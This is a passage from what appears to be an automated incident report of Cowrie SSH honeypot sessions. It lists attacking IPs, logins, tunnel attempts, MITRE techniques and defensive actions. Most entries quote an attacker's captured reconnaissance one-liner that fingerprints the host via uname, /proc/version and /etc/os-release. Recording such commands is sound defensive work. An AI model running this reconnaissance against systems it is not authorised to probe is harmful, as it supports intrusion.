| `2026-08-12 01:59:42` | `cowrie.command.input` |
| `2026-08-12 01:59:42` | `cowrie.command.input` |
| `2026-08-12 01:59:43` | `cowrie.log.closed` |
| `2026-08-12 01:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-133a313e361b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:00 |
| **Last Seen** | 2026-08-12 02:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:00:37` | `cowrie.session.connect` |
| `2026-08-12 02:00:37` | `cowrie.client.version` |
| `2026-08-12 02:00:37` | `cowrie.client.kex` |
| `2026-08-12 02:00:39` | `cowrie.login.success` |
| `2026-08-12 02:00:41` | `cowrie.session.params` |
| `2026-08-12 02:00:41` | `cowrie.command.input` |
| `2026-08-12 02:00:41` | `cowrie.command.input` |
| `2026-08-12 02:00:41` | `cowrie.command.input` |
| `2026-08-12 02:00:41` | `cowrie.command.input` |
| `2026-08-12 02:00:41` | `cowrie.command.input` |
| `2026-08-12 02:00:41` | `cowrie.command.success` |
| `2026-08-12 02:00:41` | `cowrie.command.input` |
| `2026-08-12 02:00:41` | `cowrie.command.input` |
| `2026-08-12 02:00:41` | `cowrie.command.input` |
| `2026-08-12 02:00:41` | `cowrie.command.input` |
| `2026-08-12 02:00:41` | `cowrie.log.closed` |
| `2026-08-12 02:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5da637b92b3d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:01 |
| **Last Seen** | 2026-08-12 02:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:01:32` | `cowrie.session.connect` |
| `2026-08-12 02:01:33` | `cowrie.client.version` |
| `2026-08-12 02:01:33` | `cowrie.client.kex` |
| `2026-08-12 02:01:34` | `cowrie.login.success` |
| `2026-08-12 02:01:36` | `cowrie.session.params` |
| `2026-08-12 02:01:36` | `cowrie.command.input` |
| `2026-08-12 02:01:36` | `cowrie.command.input` |
| `2026-08-12 02:01:36` | `cowrie.command.input` |
| `2026-08-12 02:01:36` | `cowrie.command.input` |
| `2026-08-12 02:01:36` | `cowrie.command.input` |
| `2026-08-12 02:01:36` | `cowrie.command.success` |
| `2026-08-12 02:01:36` | `cowrie.command.input` |
| `2026-08-12 02:01:36` | `cowrie.command.input` |
| `2026-08-12 02:01:36` | `cowrie.command.input` |
| `2026-08-12 02:01:36` | `cowrie.command.input` |
| `2026-08-12 02:01:36` | `cowrie.log.closed` |
| `2026-08-12 02:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccb7efd4bed6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:02 |
| **Last Seen** | 2026-08-12 02:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:02:28` | `cowrie.session.connect` |
| `2026-08-12 02:02:28` | `cowrie.client.version` |
| `2026-08-12 02:02:28` | `cowrie.client.kex` |
| `2026-08-12 02:02:30` | `cowrie.login.success` |
| `2026-08-12 02:02:31` | `cowrie.session.params` |
| `2026-08-12 02:02:31` | `cowrie.command.input` |
| `2026-08-12 02:02:31` | `cowrie.command.input` |
| `2026-08-12 02:02:31` | `cowrie.command.input` |
| `2026-08-12 02:02:31` | `cowrie.command.input` |
| `2026-08-12 02:02:31` | `cowrie.command.input` |
| `2026-08-12 02:02:31` | `cowrie.command.success` |
| `2026-08-12 02:02:31` | `cowrie.command.input` |
| `2026-08-12 02:02:31` | `cowrie.command.input` |
| `2026-08-12 02:02:31` | `cowrie.command.input` |
| `2026-08-12 02:02:31` | `cowrie.command.input` |
| `2026-08-12 02:02:32` | `cowrie.log.closed` |
| `2026-08-12 02:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3d40cf6d284

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:03 |
| **Last Seen** | 2026-08-12 02:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:03:24` | `cowrie.session.connect` |
| `2026-08-12 02:03:24` | `cowrie.client.version` |
| `2026-08-12 02:03:24` | `cowrie.client.kex` |
| `2026-08-12 02:03:26` | `cowrie.login.success` |
| `2026-08-12 02:03:27` | `cowrie.session.params` |
| `2026-08-12 02:03:27` | `cowrie.command.input` |
| `2026-08-12 02:03:27` | `cowrie.command.input` |
| `2026-08-12 02:03:27` | `cowrie.command.input` |
| `2026-08-12 02:03:27` | `cowrie.command.input` |
| `2026-08-12 02:03:27` | `cowrie.command.input` |
| `2026-08-12 02:03:27` | `cowrie.command.success` |
| `2026-08-12 02:03:27` | `cowrie.command.input` |
| `2026-08-12 02:03:27` | `cowrie.command.input` |
| `2026-08-12 02:03:27` | `cowrie.command.input` |
| `2026-08-12 02:03:27` | `cowrie.command.input` |
| `2026-08-12 02:03:28` | `cowrie.log.closed` |
| `2026-08-12 02:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c06c0177db53

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:04 |
| **Last Seen** | 2026-08-12 02:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:04:21` | `cowrie.session.connect` |
| `2026-08-12 02:04:22` | `cowrie.client.version` |
| `2026-08-12 02:04:22` | `cowrie.client.kex` |
| `2026-08-12 02:04:23` | `cowrie.login.success` |
| `2026-08-12 02:04:25` | `cowrie.session.params` |
| `2026-08-12 02:04:25` | `cowrie.command.input` |
| `2026-08-12 02:04:25` | `cowrie.command.input` |
| `2026-08-12 02:04:25` | `cowrie.command.input` |
| `2026-08-12 02:04:25` | `cowrie.command.input` |
| `2026-08-12 02:04:25` | `cowrie.command.input` |
| `2026-08-12 02:04:25` | `cowrie.command.success` |
| `2026-08-12 02:04:25` | `cowrie.command.input` |
| `2026-08-12 02:04:25` | `cowrie.command.input` |
| `2026-08-12 02:04:25` | `cowrie.command.input` |
| `2026-08-12 02:04:25` | `cowrie.command.input` |
| `2026-08-12 02:04:25` | `cowrie.log.closed` |
| `2026-08-12 02:04:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d543c1368e3

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]52` |
| **First Seen** | 2026-08-12 02:04 |
| **Last Seen** | 2026-08-12 02:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:04:35` | `cowrie.session.connect` |
| `2026-08-12 02:04:35` | `cowrie.client.version` |
| `2026-08-12 02:04:35` | `cowrie.client.kex` |
| `2026-08-12 02:04:36` | `cowrie.login.success` |
| `2026-08-12 02:04:36` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]52` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abc5db49e319

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]61` |
| **First Seen** | 2026-08-12 02:04 |
| **Last Seen** | 2026-08-12 02:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:04:41` | `cowrie.session.connect` |
| `2026-08-12 02:04:42` | `cowrie.client.version` |
| `2026-08-12 02:04:42` | `cowrie.client.kex` |
| `2026-08-12 02:04:43` | `cowrie.login.success` |
| `2026-08-12 02:04:43` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]61` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64cbb2455fa4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:05 |
| **Last Seen** | 2026-08-12 02:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:05:18` | `cowrie.session.connect` |
| `2026-08-12 02:05:19` | `cowrie.client.version` |
| `2026-08-12 02:05:19` | `cowrie.client.kex` |
| `2026-08-12 02:05:20` | `cowrie.login.success` |
| `2026-08-12 02:05:22` | `cowrie.session.params` |
| `2026-08-12 02:05:22` | `cowrie.command.input` |
| `2026-08-12 02:05:22` | `cowrie.command.input` |
| `2026-08-12 02:05:22` | `cowrie.command.input` |
| `2026-08-12 02:05:22` | `cowrie.command.input` |
| `2026-08-12 02:05:22` | `cowrie.command.input` |
| `2026-08-12 02:05:22` | `cowrie.command.success` |
| `2026-08-12 02:05:22` | `cowrie.command.input` |
| `2026-08-12 02:05:22` | `cowrie.command.input` |
| `2026-08-12 02:05:22` | `cowrie.command.input` |
| `2026-08-12 02:05:22` | `cowrie.command.input` |
| `2026-08-12 02:05:22` | `cowrie.log.closed` |
| `2026-08-12 02:05:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e16a6856118a

| Field | Detail |
|---|---|
| **Source IP** | `119.207.63[.]208` |
| **First Seen** | 2026-08-12 02:06 |
| **Last Seen** | 2026-08-12 02:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:06:04` | `cowrie.session.connect` |
| `2026-08-12 02:06:05` | `cowrie.client.version` |
| `2026-08-12 02:06:05` | `cowrie.client.kex` |
| `2026-08-12 02:06:07` | `cowrie.login.success` |
| `2026-08-12 02:06:08` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.207.63[.]208` to AbuseIPDB if not already reported
- [ ] Block `119.207.63[.]208` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c43a56d8572

| Field | Detail |
|---|---|
| **Source IP** | `88.84.209[.]146` |
| **First Seen** | 2026-08-12 02:06 |
| **Last Seen** | 2026-08-12 02:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:06:13` | `cowrie.session.connect` |
| `2026-08-12 02:06:13` | `cowrie.client.version` |
| `2026-08-12 02:06:13` | `cowrie.client.kex` |
| `2026-08-12 02:06:14` | `cowrie.login.success` |
| `2026-08-12 02:06:14` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.84.209[.]146` to AbuseIPDB if not already reported
- [ ] Block `88.84.209[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73cff10d325d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:06 |
| **Last Seen** | 2026-08-12 02:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:06:15` | `cowrie.session.connect` |
| `2026-08-12 02:06:16` | `cowrie.client.version` |
| `2026-08-12 02:06:16` | `cowrie.client.kex` |
| `2026-08-12 02:06:17` | `cowrie.login.success` |
| `2026-08-12 02:06:18` | `cowrie.session.params` |
| `2026-08-12 02:06:18` | `cowrie.command.input` |
| `2026-08-12 02:06:18` | `cowrie.command.input` |
| `2026-08-12 02:06:18` | `cowrie.command.input` |
| `2026-08-12 02:06:18` | `cowrie.command.input` |
| `2026-08-12 02:06:18` | `cowrie.command.input` |
| `2026-08-12 02:06:18` | `cowrie.command.success` |
| `2026-08-12 02:06:18` | `cowrie.command.input` |
| `2026-08-12 02:06:18` | `cowrie.command.input` |
| `2026-08-12 02:06:18` | `cowrie.command.input` |
| `2026-08-12 02:06:18` | `cowrie.command.input` |
| `2026-08-12 02:06:19` | `cowrie.log.closed` |
| `2026-08-12 02:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37c3d5b661d4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:07 |
| **Last Seen** | 2026-08-12 02:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:07:10` | `cowrie.session.connect` |
| `2026-08-12 02:07:10` | `cowrie.client.version` |
| `2026-08-12 02:07:10` | `cowrie.client.kex` |
| `2026-08-12 02:07:11` | `cowrie.login.success` |
| `2026-08-12 02:07:12` | `cowrie.session.params` |
| `2026-08-12 02:07:12` | `cowrie.command.input` |
| `2026-08-12 02:07:12` | `cowrie.command.input` |
| `2026-08-12 02:07:12` | `cowrie.command.input` |
| `2026-08-12 02:07:12` | `cowrie.command.input` |
| `2026-08-12 02:07:12` | `cowrie.command.input` |
| `2026-08-12 02:07:12` | `cowrie.command.success` |
| `2026-08-12 02:07:12` | `cowrie.command.input` |
| `2026-08-12 02:07:12` | `cowrie.command.input` |
| `2026-08-12 02:07:12` | `cowrie.command.input` |
| `2026-08-12 02:07:12` | `cowrie.command.input` |
| `2026-08-12 02:07:13` | `cowrie.log.closed` |
| `2026-08-12 02:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c287c2f182a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:08 |
| **Last Seen** | 2026-08-12 02:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:08:06` | `cowrie.session.connect` |
| `2026-08-12 02:08:06` | `cowrie.client.version` |
| `2026-08-12 02:08:06` | `cowrie.client.kex` |
| `2026-08-12 02:08:08` | `cowrie.login.success` |
| `2026-08-12 02:08:09` | `cowrie.session.params` |
| `2026-08-12 02:08:09` | `cowrie.command.input` |
| `2026-08-12 02:08:09` | `cowrie.command.input` |
| `2026-08-12 02:08:09` | `cowrie.command.input` |
| `2026-08-12 02:08:09` | `cowrie.command.input` |
| `2026-08-12 02:08:09` | `cowrie.command.input` |
| `2026-08-12 02:08:09` | `cowrie.command.success` |
| `2026-08-12 02:08:09` | `cowrie.command.input` |
| `2026-08-12 02:08:09` | `cowrie.command.input` |
| `2026-08-12 02:08:09` | `cowrie.command.input` |
| `2026-08-12 02:08:09` | `cowrie.command.input` |
| `2026-08-12 02:08:09` | `cowrie.log.closed` |
| `2026-08-12 02:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e241993d9c17

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:09 |
| **Last Seen** | 2026-08-12 02:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:09:04` | `cowrie.session.connect` |
| `2026-08-12 02:09:04` | `cowrie.client.version` |
| `2026-08-12 02:09:04` | `cowrie.client.kex` |
| `2026-08-12 02:09:05` | `cowrie.login.success` |
| `2026-08-12 02:09:06` | `cowrie.session.params` |
| `2026-08-12 02:09:06` | `cowrie.command.input` |
| `2026-08-12 02:09:06` | `cowrie.command.input` |
| `2026-08-12 02:09:06` | `cowrie.command.input` |
| `2026-08-12 02:09:06` | `cowrie.command.input` |
| `2026-08-12 02:09:06` | `cowrie.command.input` |
| `2026-08-12 02:09:06` | `cowrie.command.success` |
| `2026-08-12 02:09:06` | `cowrie.command.input` |
| `2026-08-12 02:09:06` | `cowrie.command.input` |
| `2026-08-12 02:09:06` | `cowrie.command.input` |
| `2026-08-12 02:09:06` | `cowrie.command.input` |
| `2026-08-12 02:09:06` | `cowrie.log.closed` |
| `2026-08-12 02:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb4fd25522a0

